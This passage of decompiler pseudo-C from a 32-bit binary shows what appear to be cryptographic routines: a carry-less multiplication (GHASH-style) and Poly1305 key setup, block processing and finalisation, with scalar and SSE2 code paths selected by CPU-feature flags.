  v22[5] = v4 ^ v3;
  v22[6] = v4;
  v22[7] = v4 ^ v3 ^ v4 ^ (4 * a1);
  v5 = a2 & (a1 >> 31);
  v6 = a2 & ((2 * a1) >> 31);
  v7 = a2 & 7;
  v8 = a2 >> 3;
  v9 = v8 & 7;
  v8 >>= 3;
  v10 = v22[v7] ^ (v6 << 30) ^ (v5 << 31);
  v11 = v8 & 7;
  v8 >>= 3;
  v12 = v22[v9];
  v13 = v8 & 7;
  v8 >>= 3;
  v14 = v22[v11];
  v15 = v8 & 7;
  v16 = (v14 << 6) ^ (8 * v12) ^ v10;
  v8 >>= 3;
  v17 = v22[v13];
  v18 = v8 & 7;
  v8 >>= 3;
  v19 = v22[v15];
  v20 = v8 & 7;
  v8 >>= 3;
  return (v22[(v8 >> 9) & 7] << 30) ^ (v22[(v8 >> 6) & 7] << 27) ^ (v22[(v8 >> 3) & 7] << 24) ^ (v22[v8 & 7] << 21) ^ (v22[v20] << 18) ^ (v22[v18] << 15) ^ (v19 << 12) ^ (v17 << 9) ^ v16;
}

//----- (004D1800) --------------------------------------------------------
int __usercall sub_4D1800@<eax>(__m64 a1@<mm0>, int a2, __m128 a3)
{
  int result; // eax
  __m64 v6; // mm2
  int v7; // edx
  int v8; // edx
  int v9; // eax
  int v10; // edx
  int v11; // eax
  int v12; // edx
  int v13; // [esp+0h] [ebp-24h]
  int v14; // [esp+4h] [ebp-20h]
  int v15; // [esp+8h] [ebp-1Ch]
  int v16; // [esp+Ch] [ebp-18h]

  if ( (dword_73C6D0 & 0x800000) != 0 )
  {
    if ( (dword_73C6D0 & 0x1000000) != 0 && (*(&dword_73C6D0 + 1) & 2) != 0 )
    {
      _XMM0 = _mm_shuffle_ps(a3, a3, 177);
      __asm { pclmulqdq xmm0, xmm0, 1 }
      result = a2;
      *(_OWORD *)a2 = _XMM0;
    }
    else
    {
      sub_4D1540();
      sub_4D1540();
      sub_4D1540();
      result = a2;
      v6 = _m_pxor(_m_pxor(a1, a1), a1);
      *(__m64 *)a2 = _m_pxor(_m_psllqi(v6, 0x20u), a1);
      *(__m64 *)(a2 + 8) = _m_pxor(_m_psrlqi(v6, 0x20u), a1);
      _m_empty();
    }
  }
  else
  {
    v15 = sub_4D1680(a3.m128_i32[0], a3.m128_u32[2]);
    v16 = v7;
    v13 = sub_4D1680(a3.m128_i32[1], a3.m128_u32[3]);
    v14 = v8;
    v9 = sub_4D1680(a3.m128_i32[1] ^ a3.m128_i32[0], a3.m128_i32[3] ^ a3.m128_i32[2]);
    v11 = v10 ^ v9;
    *(_DWORD *)a2 = v13;
    *(_DWORD *)(a2 + 12) = v16;
    v12 = v16 ^ v15 ^ v14 ^ v10;
    result = v12 ^ v16 ^ v13 ^ v11;
    *(_DWORD *)(a2 + 8) = v12;
    *(_DWORD *)(a2 + 4) = result;
  }
  return result;
}
// 4D18D8: variable 'v7' is possibly undefined
// 4D18EC: variable 'v8' is possibly undefined
// 4D1918: variable 'v10' is possibly undefined
// 73C6D0: using guessed type int dword_73C6D0;

//----- (004D1980) --------------------------------------------------------
int __cdecl sub_4D1980(_DWORD *a1, _DWORD *a2, _DWORD *a3)
{
  int result; // eax
  void *v4; // eax
  void *v5; // edx
  int v6; // ebx
  int v7; // ecx
  int v8; // edx

  result = 0;
  *a1 = 0;
  a1[1] = 0;
  a1[2] = 0;
  a1[3] = 0;
  a1[4] = 0;
  a1[5] = 0;
  if ( a2 )
  {
    v4 = sub_4D1A40;
    v5 = sub_4D1C20;
    if ( (dword_73C6D0 & 0x5000000) == 83886080 )
    {
      v4 = sub_4D2060;
      v5 = sub_4D2DE0;
      if ( (*(&dword_73C6D0 + 2) & 0x20) != 0 )
        v4 = sub_4D3200;
    }
    *a3 = v4;
    a3[1] = v5;
    v6 = a2[1] & 0xFFFFFFC;
    v7 = a2[2] & 0xFFFFFFC;
    v8 = a2[3] & 0xFFFFFFC;
    a1[6] = *a2 & 0xFFFFFFF;
    a1[7] = v6;
    a1[8] = v7;
    a1[9] = v8;
    return 1;
  }
  return result;
}
// 73C6D0: using guessed type int dword_73C6D0;

//----- (004D1A40) --------------------------------------------------------
void __cdecl sub_4D1A40(unsigned int *a1, int a2, int a3, int a4)
{
  int v4; // ebp
  unsigned int v5; // eax
  unsigned int v6; // ebx
  unsigned int v7; // ecx
  int v8; // esi
  unsigned int v9; // edi
  unsigned __int64 v10; // kr38_8
  bool v11; // cf
  unsigned int v12; // ecx
  int v13; // esi
  BOOL v14; // ett
  unsigned __int64 v15; // rdi
  unsigned __int64 v16; // rdi
  unsigned int v17; // edx
  int v18; // kr78_4
  int v19; // [esp+Ch] [ebp-44h]
  int v20; // [esp+10h] [ebp-40h]
  __int64 v21; // [esp+14h] [ebp-3Ch]
  int v22; // [esp+1Ch] [ebp-34h]
  unsigned int v23; // [esp+24h] [ebp-2Ch]
  unsigned int v24; // [esp+28h] [ebp-28h]
  unsigned int v25; // [esp+2Ch] [ebp-24h]
  unsigned int v26; // [esp+30h] [ebp-20h]
  unsigned int v27; // [esp+34h] [ebp-1Ch]
  unsigned int v28; // [esp+38h] [ebp-18h]
  unsigned int v29; // [esp+3Ch] [ebp-14h]
  int v30; // [esp+5Ch] [ebp+Ch]

  if ( (a3 & 0xFFFFFFF1) != 0 )
  {
    v30 = a2 + (a3 & 0xFFFFFFF1);
    v4 = a2;
    v23 = a1[6];
    v24 = a1[7];
    v25 = a1[8];
    v26 = a1[9];
    v27 = v24 + (v24 >> 2);
    v28 = v25 + (v25 >> 2);
    v29 = v26 + (v26 >> 2);
    v5 = *a1;
    v6 = a1[1];
    v7 = a1[2];
    v8 = a1[3];
    v9 = a1[4];
    do
    {
      v10 = *(_QWORD *)v4 + __PAIR64__(v6, v5);
      v11 = __CFADD__(__CFADD__(*(_QWORD *)v4, __PAIR64__(v6, v5)), v7);
      v12 = __CFADD__(*(_QWORD *)v4, __PAIR64__(v6, v5)) + v7;
      v11 |= __CFADD__(*(_DWORD *)(v4 + 8), v12);
      v12 += *(_DWORD *)(v4 + 8);
      v14 = v11;
      v11 = __CFADD__(v11, v8);
      v13 = v14 + v8;
      v11 |= __CFADD__(*(_DWORD *)(v4 + 12), v13);
      v13 += *(_DWORD *)(v4 + 12);
      v4 += 16;
      v19 = v13;
      v20 = a4 + v11 + v9;
      v15 = v27 * (unsigned __int64)(unsigned int)v13
          + v28 * (unsigned __int64)v12
          + v29 * (unsigned __int64)HIDWORD(v10)
          + v23 * (unsigned __int64)(unsigned int)v10;
      LODWORD(v21) = v15;
      HIDWORD(v21) = v28 * v19 + v29 * v12 + v23 * HIDWORD(v10) + HIDWORD(v15) + v24 * v10 + v27 * v20;
      v16 = v29 * (unsigned __int64)(unsigned int)v19
          + v23 * (unsigned __int64)v12
          + v24 * (unsigned __int64)HIDWORD(v10)
          + v25 * (unsigned __int64)(unsigned int)v10
          + ((v28 * (unsigned __int64)(unsigned int)v19
            + v29 * (unsigned __int64)v12
            + v23 * (unsigned __int64)HIDWORD(v10)
            + HIDWORD(v15)
            + v24 * (unsigned __int64)(unsigned int)v10
            + v27 * v20) >> 32)
          + v28 * v20;
      v22 = v16;
      LODWORD(v16) = (v23 * (unsigned __int64)(unsigned int)v19
                    + v24 * (unsigned __int64)v12
                    + v25 * (unsigned __int64)HIDWORD(v10)
                    + HIDWORD(v16)
                    + v26 * (unsigned __int64)(unsigned int)v10
                    + v29 * v20) >> 32;
      HIDWORD(v16) += v23 * v19 + v24 * v12 + v25 * HIDWORD(v10) + v26 * v10 + v29 * v20;
      v17 = 5 * (((unsigned int)v16 + v23 * v20) >> 2);
      v6 = ((unsigned __int64)v17 + v21) >> 32;
      v5 = v17 + v21;
      v7 = __CFADD__(v17, v21) + v22;
      v18 = __CFADD__(__CFADD__(v17, v21), v22) + HIDWORD(v16);
      v9 = (__PAIR64__(((_BYTE)v16 + (_BYTE)v23 * (_BYTE)v20) & 3, __CFADD__(__CFADD__(v17, v21), v22)) + HIDWORD(v16)) >> 32;
      v8 = v18;
    }
    while ( v4 != v30 );
    *a1 = v5;
    a1[1] = v6;
    a1[2] = v7;
    a1[3] = v18;
    a1[4] = v9;
  }
}

//----- (004D1C20) --------------------------------------------------------
int __cdecl sub_4D1C20(int a1, _DWORD *a2, int a3)
{
  int v3; // edx
  int v4; // ecx
  __int64 v5; // kr00_8
  unsigned __int64 v6; // kr08_8
  unsigned __int128 v7; // kr20_16
  unsigned int v8; // esi
  int v9; // esi
  int v10; // eax
  int v11; // ebx
  int v12; // ecx
  bool v13; // cf
  int result; // eax
  unsigned __int64 v15; // kr10_8
  int v16; // ecx
  BOOL v17; // ett
  int v18; // edx

  v7 = *(_OWORD *)a1 + 5i64;
  v6 = v7 >> 64;
  v3 = HIDWORD(v6);
  v4 = v6;
  v5 = v7;
  v8 = -((unsigned int)((*(_QWORD *)(a1 + 12)
                       + (unsigned __int64)__CFADD__(__CFADD__(*(_QWORD *)a1, 5i64), *(_DWORD *)(a1 + 8))) >> 32) >> 2);
  *a2 = v8 & v5;
  a2[1] = v8 & HIDWORD(v5);
  a2[2] = v8 & v4;
  a2[3] = v8 & v3;
  v9 = ~v8;
  v10 = *a2 | v9 & *(_DWORD *)a1;
  v11 = a2[1] | v9 & *(_DWORD *)(a1 + 4);
  v12 = a2[2] | v9 & *(_DWORD *)(a1 + 8);
  v13 = __CFADD__(*(_QWORD *)a3, __PAIR64__(v11, v10));
  v15 = *(_QWORD *)a3 + __PAIR64__(v11, v10);
  result = *(_DWORD *)a3 + v10;
  v17 = v13;
  v13 = __CFADD__(v13, v12);
  v16 = v17 + v12;
  v13 |= __CFADD__(*(_DWORD *)(a3 + 8), v16);
  v16 += *(_DWORD *)(a3 + 8);
  v18 = *(_DWORD *)(a3 + 12) + v13 + (a2[3] | v9 & *(_DWORD *)(a1 + 12));
  *(_QWORD *)a2 = v15;
  a2[2] = v16;
  a2[3] = v18;
  return result;
}

//----- (004D1CC0) --------------------------------------------------------
void __usercall sub_4D1CC0(const __m128i *a1@<ebx>, int a2@<edi>)
{
  __m128i v2; // xmm4
  __m128i *v3; // edi
  __m128i v4; // xmm7
  __m128i v5; // xmm0
  __m128i v6; // xmm1
  __m128i v7; // xmm3
  __m128i v8; // xmm2
  __m128i v9; // xmm3
  __m128i v10; // xmm4
  int v11; // ecx
  __m128i v12; // xmm6
  __m128i v13; // xmm3
  __m128i v14; // xmm5
  __m128i v15; // xmm2
  __m128i v16; // xmm7
  __m128i v17; // xmm4
  __m128i v18; // xmm6
  __m128i v19; // xmm3
  __m128i v20; // xmm2
  __m128i v21; // xmm1
  __m128i v22; // xmm0
  __m128i v23; // xmm7
  __m128i v24; // xmm6
  __m128i v25; // xmm5
  __m128i v26; // xmm0
  __m128i si128; // xmm7
  __m128i v28; // xmm1
  __m128i v29; // xmm2
  __m128i v30; // xmm5
  __m128i v31; // xmm3
  __m128i v32; // xmm4
  __m128i v33; // xmm5
  __m128i v34; // xmm1
  __m128i v35; // xmm6
  __m128i v36; // xmm2
  __m128i v37; // xmm0
  __m128i v38; // xmm5
  __m128i v39; // xmm3
  __m128i v40; // xmm6
  __m128i v41; // xmm0
  __m128i v42; // xmm1
  __m128i v43; // xmm3
  __m128i v44; // xmm4
  __m128i v45; // xmm1
  __m128i v46; // xmm2
  __m128i v47; // xmm3
  __m128i v48; // xmm4
  __m128i v49; // [esp+0h] [ebp-E0h]
  __m128i v50; // [esp+10h] [ebp-D0h]
  __m128i v51; // [esp+20h] [ebp-C0h] BYREF
  __m128i v52; // [esp+30h] [ebp-B0h] BYREF
  __m128i v53; // [esp+40h] [ebp-A0h] BYREF
  __m128i v54; // [esp+50h] [ebp-90h] BYREF
  __m128i v55; // [esp+60h] [ebp-80h] BYREF
  __m128i v56; // [esp+70h] [ebp-70h] BYREF
  __m128i v57; // [esp+80h] [ebp-60h] BYREF
  __m128i v58; // [esp+90h] [ebp-50h]
  __m128i v59; // [esp+A0h] [ebp-40h]
  __m128i v60; // [esp+B0h] [ebp-30h]
  __m128i v61; // [esp+C0h] [ebp-20h]
  __m128i v62; // [esp+D0h] [ebp-10h]

  v2 = _mm_loadu_si128((const __m128i *)(a2 + 24));
  v3 = (__m128i *)(a2 + 48);
  v4 = _mm_loadl_epi64(a1 + 4);
  v5 = _mm_and_si128(v2, v4);
  v6 = _mm_and_si128(_mm_srli_epi64(v2, 0x1Au), v4);
  v7 = _mm_srli_si128(v2, 6);
  v8 = _mm_and_si128(_mm_srli_epi64(v7, 4u), v4);
  v9 = _mm_and_si128(_mm_srli_epi64(v7, 0x1Eu), v4);
  v10 = _mm_srli_si128(v2, 13);
  v11 = 2;
  while ( 1 )
  {
    v49 = v5;
    v50 = v6;
    v51 = v8;
    v52 = v9;
    v53 = v10;
    v54 = _mm_add_epi32(_mm_slli_epi32(v6, 2u), v6);
    v55 = _mm_add_epi32(_mm_slli_epi32(v8, 2u), v8);
    v56 = _mm_add_epi32(_mm_slli_epi32(v9, 2u), v9);
    v57 = _mm_add_epi32(_mm_slli_epi32(v10, 2u), v10);
    v58 = _mm_shuffle_epi32(v5, 68);
    v59 = _mm_shuffle_epi32(v6, 68);
    v60 = _mm_shuffle_epi32(v8, 68);
    v61 = _mm_shuffle_epi32(v9, 68);
    v62 = _mm_shuffle_epi32(v10, 68);
    v12 = _mm_load_si128(&v51);
    v13 = _mm_add_epi64(_mm_add_epi64(_mm_mul_epu32(v61, v5), _mm_mul_epu32(v6, v60)), _mm_mul_epu32(v12, v59));
    v14 = _mm_load_si128(&v55);
    v15 = _mm_add_epi64(_mm_add_epi64(_mm_mul_epu32(v60, v5), _mm_mul_epu32(v6, v59)), _mm_mul_epu32(v12, v58));
    v16 = _mm_load_si128(&v52);
    v17 = _mm_add_epi64(
            _mm_add_epi64(_mm_add_epi64(_mm_mul_epu32(v62, v5), _mm_mul_epu32(v6, v61)), _mm_mul_epu32(v12, v60)),
            _mm_mul_epu32(v16, v59));
    v18 = _mm_load_si128(&v56);
    v19 = _mm_add_epi64(v13, _mm_mul_epu32(v16, v58));
    v20 = _mm_add_epi64(v15, _mm_mul_epu32(v18, v62));
    v21 = _mm_add_epi64(
            _mm_add_epi64(_mm_add_epi64(_mm_mul_epu32(v59, v5), _mm_mul_epu32(v6, v58)), _mm_mul_epu32(v14, v62)),
            _mm_mul_epu32(v18, v61));
    v22 = _mm_add_epi64(
            _mm_add_epi64(
              _mm_add_epi64(_mm_mul_epu32(v5, v58), _mm_mul_epu32(_mm_load_si128(&v54), v62)),
              _mm_mul_epu32(v14, v61)),
            _mm_mul_epu32(v18, v60));
    v23 = _mm_load_si128(&v57);
    v24 = _mm_mul_epu32(v23, v62);
    v25 = v23;
    v26 = _mm_add_epi64(v22, _mm_mul_epu32(v23, v59));
    si128 = _mm_load_si128(a1 + 4);
    v28 = _mm_add_epi64(v21, _mm_mul_epu32(v25, v60));
    v29 = _mm_add_epi64(v20, _mm_mul_epu32(v25, v61));
    v30 = _mm_add_epi64(v19, v24);
    v31 = _mm_and_si128(v30, si128);
    v32 = _mm_add_epi64(_mm_srli_epi64(v30, 0x1Au), _mm_add_epi64(v17, _mm_mul_epu32(_mm_load_si128(&v53), v58)));
    v33 = _mm_srli_epi64(v32, 0x1Au);
    v34 = _mm_add_epi64(_mm_srli_epi64(v26, 0x1Au), v28);
    v35 = _mm_add_epi64(_mm_srli_epi64(v34, 0x1Au), v29);
    v36 = _mm_and_si128(v35, si128);
    v37 = _mm_add_epi64(_mm_slli_epi64(v33, 2u), _mm_add_epi32(_mm_and_si128(v26, si128), v33));
    v38 = _mm_srli_epi64(v37, 0x1Au);
    v39 = _mm_add_epi32(_mm_srli_epi64(v35, 0x1Au), v31);
    v40 = _mm_srli_epi64(v39, 0x1Au);
    v41 = _mm_and_si128(v37, si128);
    v42 = _mm_add_epi32(_mm_and_si128(v34, si128), v38);
    v43 = _mm_and_si128(v39, si128);
    v44 = _mm_add_epi32(_mm_and_si128(v32, si128), v40);
    if ( !--v11 )
      break;
    v5 = _mm_unpacklo_epi64(v41, v49);
    v6 = _mm_unpacklo_epi64(v42, v50);
    v8 = _mm_unpacklo_epi64(v36, v51);
    v9 = _mm_unpacklo_epi64(v43, v52);
    v10 = _mm_unpacklo_epi64(v44, v53);
  }
  v45 = _mm_shuffle_epi32(_mm_or_si128(_mm_slli_epi64(v42, 0x20u), v50), 141);
  v46 = _mm_shuffle_epi32(_mm_or_si128(_mm_slli_epi64(v36, 0x20u), v51), 141);
  v47 = _mm_shuffle_epi32(_mm_or_si128(_mm_slli_epi64(v43, 0x20u), v52), 141);
  v48 = _mm_shuffle_epi32(_mm_or_si128(_mm_slli_epi64(v44, 0x20u), v53), 141);
  *v3 = _mm_shuffle_epi32(_mm_or_si128(_mm_slli_epi64(v41, 0x20u), v49), 141);
  v3[1] = v45;
  v3[2] = v46;
  v3[3] = v47;
  v3[4] = v48;
  v3[5] = _mm_add_epi32(_mm_slli_epi32(v45, 2u), v45);
  v3[6] = _mm_add_epi32(_mm_slli_epi32(v46, 2u), v46);
  v3[7] = _mm_add_epi32(_mm_slli_epi32(v47, 2u), v47);
  v3[8] = _mm_add_epi32(_mm_slli_epi32(v48, 2u), v48);
}

//----- (004D2060) --------------------------------------------------------
__m128i *__usercall sub_4D2060@<eax>(__m128i si128@<xmm7>, int a2, const __m128i *a3, unsigned int a4, int a5)
{
  const __m128i *v5; // esi
  __m128i *result; // eax
  unsigned int v7; // ecx
  unsigned int v8; // eax
  unsigned int v9; // ecx
  unsigned int v10; // edx
  unsigned int v11; // esi
  unsigned int v12; // ebp
  __m128i v13; // xmm0
  __m128i v14; // xmm1
  __m128i v15; // xmm2
  __m128i v16; // xmm3
  __m128i v17; // xmm4
  __m128i v18; // xmm6
  __m128i v19; // xmm0
  __m128i v20; // xmm1
  __m128i v21; // xmm5
  __m128i v22; // xmm6
  __m128i v23; // xmm0
  __m128i v24; // xmm1
  __m128i v25; // xmm2
  __m128i v26; // xmm3
  __m128i v27; // xmm4
  __m128i v28; // xmm6
  __m128i v29; // xmm4
  __m128i v30; // xmm3
  __m128i v31; // xmm2
  __m128i v32; // xmm1
  __m128i v33; // xmm6
  __m128i v34; // xmm3
  __m128i v35; // xmm5
  __m128i v36; // xmm2
  __m128i v37; // xmm7
  __m128i v38; // xmm4
  __m128i v39; // xmm6
  __m128i v40; // xmm3
  __m128i v41; // xmm2
  __m128i v42; // xmm1
  __m128i v43; // xmm0
  __m128i v44; // xmm7
  __m128i v45; // xmm6
  __m128i v46; // xmm5
  __m128i v47; // xmm0
  __m128i v48; // xmm1
  __m128i v49; // xmm2
  __m128i v50; // xmm5
  __m128i v51; // xmm3
  __m128i v52; // xmm4
  __m128i v53; // xmm5
  __m128i v54; // xmm1
  __m128i v55; // xmm6
  __m128i v56; // xmm0
  __m128i v57; // xmm5
  __m128i v58; // xmm3
  __m128i v59; // xmm6
  bool v60; // cf
  unsigned int v61; // ecx
  __m128i v62; // xmm5
  __m128i v63; // xmm6
  __m128i v64; // xmm6
  __m128i v65; // xmm5
  __m128i v66; // xmm6
  __m128i v67; // xmm5
  __m128i v68; // xmm6
  __m128i v69; // xmm5
  __m128i v70; // xmm6
  __m128i v71; // xmm5
  __m128i v72; // xmm5
  __m128i v73; // xmm6
  const __m128i *v74; // esi
  __m128i v75; // xmm2
  __m128i v76; // xmm4
  __m128i v77; // xmm5
  __m128i v78; // xmm3
  __m128i v79; // xmm6
  __m128i v80; // xmm5
  __m128i v81; // xmm6
  __m128i v82; // xmm2
  __m128i v83; // xmm3
  __m128i v84; // xmm4
  __m128i v85; // xmm7
  __m128i v86; // xmm0
  __m128i v87; // xmm1
  __m128i v88; // xmm6
  __m128i v89; // xmm2
  __m128i v90; // xmm3
  __m128i v91; // xmm4
  __m128i v92; // xmm7
  __m128i v93; // xmm1
  __m128i v94; // xmm6
  __m128i v95; // xmm4
  __m128i v96; // xmm5
  __m128i v97; // xmm3
  __m128i v98; // xmm0
  __m128i v99; // xmm7
  __m128i v100; // xmm1
  __m128i v101; // xmm2
  __m128i v102; // xmm5
  __m128i v103; // xmm6
  const __m128i *v104; // esi
  __m128i v105; // xmm2
  __m128i v106; // xmm4
  __m128i v107; // xmm5
  __m128i v108; // xmm3
  __m128i v109; // xmm6
  bool v110; // cf
  __m128i v111; // xmm5
  __m128i v112; // xmm6
  __m128i v113; // xmm2
  __m128i v114; // xmm3
  __m128i v115; // xmm4
  __m128i v116; // xmm7
  __m128i v117; // xmm0
  __m128i v118; // xmm1
  __m128i v119; // xmm6
  __m128i v120; // xmm2
  __m128i v121; // xmm3
  __m128i v122; // xmm4
  __m128i v123; // xmm7
  __m128i v124; // xmm3
  __m128i v125; // xmm6
  __m128i v126; // xmm4
  __m128i v127; // xmm0
  __m128i v128; // xmm5
  __m128i v129; // xmm1
  __m128i v130; // xmm2
  __m128i v131; // xmm7
  __m128i v132; // xmm6
  __m128i v133; // xmm4
  __m128i v134; // xmm5
  __m128i v135; // xmm0
  __m128i v136; // xmm7
  __m128i v137; // xmm1
  __m128i v138; // xmm2
  __m128i v139; // xmm5
  __m128i v140; // xmm3
  __m128i v141; // xmm4
  __m128i v142; // xmm5
  __m128i v143; // xmm1
  __m128i v144; // xmm2
  __m128i v145; // xmm0
  __m128i v146; // xmm5
  __m128i v147; // xmm3
  __m128i v148; // xmm5
  __m128i v149; // xmm6
  __m128i v150; // xmm2
  __m128i v151; // xmm4
  __m128i v152; // xmm5
  __m128i v153; // xmm3
  __m128i v154; // xmm6
  __m128i v155; // xmm7
  __m128i v156; // xmm0
  __m128i v157; // xmm1
  __m128i v158; // xmm6
  __m128i v159; // xmm4
  __m128i v160; // xmm3
  __m128i v161; // xmm2
  __m128i v162; // xmm1
  __m128i v163; // xmm6
  __m128i v164; // xmm3
  __m128i v165; // xmm5
  __m128i v166; // xmm2
  __m128i v167; // xmm7
  __m128i v168; // xmm4
  __m128i v169; // xmm6
  __m128i v170; // xmm1
  __m128i v171; // xmm0
  __m128i v172; // xmm4
  __m128i v173; // xmm5
  __m128i v174; // xmm3
  __m128i v175; // xmm0
  __m128i v176; // xmm7
  __m128i v177; // xmm1
  __m128i v178; // xmm2
  __m128i v179; // xmm5
  __m128i v180; // xmm6
  __m128i v181; // xmm2
  __m128i v182; // xmm4
  __m128i v183; // xmm5
  __m128i v184; // xmm3
  __m128i v185; // xmm6
  __m128i v186; // xmm5
  __m128i v187; // xmm6
  __m128i v188; // xmm2
  __m128i v189; // xmm3
  __m128i v190; // xmm7
  __m128i v191; // xmm0
  __m128i v192; // xmm5
  __m128i v193; // xmm6
  __m128i v194; // xmm2
  __m128i v195; // xmm3
  __m128i v196; // xmm6
  __m128i v197; // xmm4
  __m128i v198; // xmm6
  __m128i v199; // xmm4
  __m128i v200; // xmm3
  __m128i v201; // xmm2
  __m128i v202; // xmm1
  __m128i v203; // xmm6
  __m128i v204; // xmm4
  __m128i v205; // xmm3
  __m128i v206; // xmm5
  __m128i v207; // xmm2
  __m128i v208; // xmm7
  __m128i v209; // xmm6
  __m128i v210; // xmm1
  __m128i v211; // xmm0
  __m128i v212; // xmm5
  __m128i v213; // xmm5
  __m128i v214; // xmm3
  __m128i v215; // xmm6
  __m128i v216; // xmm0
  __m128i v217; // xmm4
  __m128i v218; // xmm5
  __m128i v219; // xmm1
  __m128i v220; // xmm6
  __m128i v221; // xmm0
  __m128i v222; // xmm5
  __m128i v223; // xmm3
  __m128i v224; // xmm6
  __m128i v225; // [esp+0h] [ebp-220h]
  __m128i v226; // [esp+0h] [ebp-220h]
  __m128i v227; // [esp+10h] [ebp-210h]
  __m128i v228; // [esp+10h] [ebp-210h]
  __m128i v229; // [esp+20h] [ebp-200h]
  __m128i v230; // [esp+20h] [ebp-200h]
  __m128i v231; // [esp+20h] [ebp-200h]
  __m128i v232; // [esp+20h] [ebp-200h]
  __m128i v233; // [esp+30h] [ebp-1F0h]
  __m128i v234; // [esp+30h] [ebp-1F0h]
  __m128i v235; // [esp+30h] [ebp-1F0h]
  __m128i v236; // [esp+30h] [ebp-1F0h]
  __m128i v237; // [esp+40h] [ebp-1E0h]
  __m128i v238; // [esp+40h] [ebp-1E0h]
  __m128i v239; // [esp+40h] [ebp-1E0h]
  __m128i v240; // [esp+40h] [ebp-1E0h]
  __m128i v241; // [esp+50h] [ebp-1D0h]
  __m128i v242; // [esp+60h] [ebp-1C0h]
  __m128i v243; // [esp+70h] [ebp-1B0h]
  __m128i v244; // [esp+80h] [ebp-1A0h]
  __m128i v245; // [esp+90h] [ebp-190h]
  __m128i v246; // [esp+A0h] [ebp-180h] BYREF
  __m128i v247; // [esp+B0h] [ebp-170h] BYREF
  __m128i v248; // [esp+C0h] [ebp-160h] BYREF
  __m128i v249; // [esp+D0h] [ebp-150h] BYREF
  __m128i v250; // [esp+E0h] [ebp-140h] BYREF
  __m128i v251; // [esp+F0h] [ebp-130h] BYREF
  __m128i v252; // [esp+100h] [ebp-120h]
  __m128i v253; // [esp+110h] [ebp-110h]
  __m128i v254; // [esp+120h] [ebp-100h]
  __m128i v255; // [esp+130h] [ebp-F0h]
  __m128i v256; // [esp+140h] [ebp-E0h]
  __m128i v257; // [esp+150h] [ebp-D0h]
  __m128i v258; // [esp+160h] [ebp-C0h]
  __m128i v259; // [esp+170h] [ebp-B0h]
  __m128i v260; // [esp+180h] [ebp-A0h] BYREF
  __m128i v261; // [esp+190h] [ebp-90h]
  __m128i v262; // [esp+1A0h] [ebp-80h]
  __m128i v263; // [esp+1B0h] [ebp-70h]
  __m128i v264; // [esp+1C0h] [ebp-60h]
  __m128i v265; // [esp+1D0h] [ebp-50h]
  __m128i v266; // [esp+1E0h] [ebp-40h]
  __m128i v267; // [esp+1F0h] [ebp-30h]
  __m128i v268; // [esp+200h] [ebp-20h]

  v5 = a3;
  result = *(__m128i **)(a2 + 20);
  v7 = a4 & 0xFFFFFFF0;
  if ( (a4 & 0xFFFFFFF0) != 0 )
  {
    if ( v7 < 0x40 && !result )
      JUMPOUT(0x4D1A50);
    v268.m128i_i32[3] = 5054613;
    if ( result )
    {
      v13 = _mm_cvtsi32_si128(*(_DWORD *)a2);
      v14 = _mm_cvtsi32_si128(*(_DWORD *)(a2 + 4));
      v15 = _mm_cvtsi32_si128(*(_DWORD *)(a2 + 8));
      v16 = _mm_cvtsi32_si128(*(_DWORD *)(a2 + 12));
      v17 = _mm_cvtsi32_si128(*(_DWORD *)(a2 + 16));
      si128 = _mm_load_si128((const __m128i *)&dword_4D38C0[16]);
    }
    else
    {
      sub_4D1CC0((const __m128i *)dword_4D38C0, a2);
      v8 = *(_DWORD *)a2;
      v9 = *(_DWORD *)(a2 + 3);
      v10 = *(_DWORD *)(a2 + 6);
      v11 = *(_DWORD *)(a2 + 9);
      v12 = *(_DWORD *)(a2 + 13);
      *(_DWORD *)(a2 + 20) = 1;
      v13 = _mm_cvtsi32_si128(v8 & 0x3FFFFFF);
      v14 = _mm_cvtsi32_si128((v9 >> 2) & 0x3FFFFFF);
      v15 = _mm_cvtsi32_si128((v10 >> 4) & 0x3FFFFFF);
      v16 = _mm_cvtsi32_si128(v11 >> 6);
      v17 = _mm_cvtsi32_si128(v12);
      v5 = a3;
      v7 = a4;
    }
    result = (__m128i *)(a5 << 24);
    if ( (v7 & 0x1F) == 0 )
      goto LABEL_9;
    v18 = _mm_loadu_si128(v5++);
    v19 = _mm_add_epi32(v13, _mm_and_si128(v18, si128));
    v20 = _mm_add_epi32(v14, _mm_and_si128(_mm_srli_epi64(v18, 0x1Au), si128));
    v21 = _mm_srli_si128(v18, 6);
    v22 = _mm_cvtsi32_si128(*(_DWORD *)(a2 + 60));
    v225 = v19;
    v227 = v20;
    v229 = _mm_add_epi32(v15, _mm_and_si128(_mm_srli_epi64(v21, 4u), si128));
    v233 = _mm_add_epi32(v16, _mm_and_si128(_mm_srli_epi64(v21, 0x1Eu), si128));
    v237 = _mm_add_epi32(_mm_add_epi32(v17, _mm_srli_si128(v21, 7)), _mm_cvtsi32_si128((unsigned int)result));
    v23 = _mm_mul_epu32(v19, v22);
    v24 = _mm_mul_epu32(v20, v22);
    v25 = _mm_mul_epu32(v229, v22);
    v26 = _mm_mul_epu32(v233, v22);
    v27 = _mm_mul_epu32(v237, v22);
    v28 = _mm_cvtsi32_si128(*(_DWORD *)(a2 + 76));
    v29 = _mm_add_epi64(v27, _mm_mul_epu32(v28, v233));
    v30 = _mm_add_epi64(v26, _mm_mul_epu32(v28, v229));
    v31 = _mm_add_epi64(v25, _mm_mul_epu32(v28, v227));
    v32 = _mm_add_epi64(v24, _mm_mul_epu32(v28, v225));
    v33 = _mm_cvtsi32_si128(*(_DWORD *)(a2 + 92));
    v34 = _mm_add_epi64(v30, _mm_mul_epu32(v33, v227));
    v35 = _mm_cvtsi32_si128(*(_DWORD *)(a2 + 156));
    v36 = _mm_add_epi64(v31, _mm_mul_epu32(v33, v225));
    v37 = _mm_cvtsi32_si128(*(_DWORD *)(a2 + 108));
    v38 = _mm_add_epi64(_mm_add_epi64(v29, _mm_mul_epu32(v33, v229)), _mm_mul_epu32(v37, v227));
    v39 = _mm_cvtsi32_si128(*(_DWORD *)(a2 + 172));
    v40 = _mm_add_epi64(v34, _mm_mul_epu32(v37, v225));
    v41 = _mm_add_epi64(v36, _mm_mul_epu32(v39, v237));
    v42 = _mm_add_epi64(_mm_add_epi64(v32, _mm_mul_epu32(v35, v237)), _mm_mul_epu32(v39, v233));
    v43 = _mm_add_epi64(
            _mm_add_epi64(
              _mm_add_epi64(v23, _mm_mul_epu32(_mm_cvtsi32_si128(*(_DWORD *)(a2 + 140)), v237)),
              _mm_mul_epu32(v35, v233)),
            _mm_mul_epu32(v39, v229));
    v44 = _mm_cvtsi32_si128(*(_DWORD *)(a2 + 188));
